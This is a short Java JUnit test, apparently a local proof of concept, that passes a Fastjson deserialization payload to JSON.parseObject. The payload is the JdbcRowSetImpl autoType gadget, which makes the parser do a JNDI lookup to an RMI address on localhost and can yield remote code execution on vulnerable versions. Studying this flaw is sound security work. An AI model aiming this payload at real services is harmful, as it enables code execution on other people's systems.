package rmi;

import com.alibaba.fastjson.JSON;
import org.junit.Test;

public class fastjsonTest {

  @Test
  public void payload1() {
    String payload =
      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/JNDI\",\"autoCommit\":true}";
    JSON.parseObject(payload);
  }
}
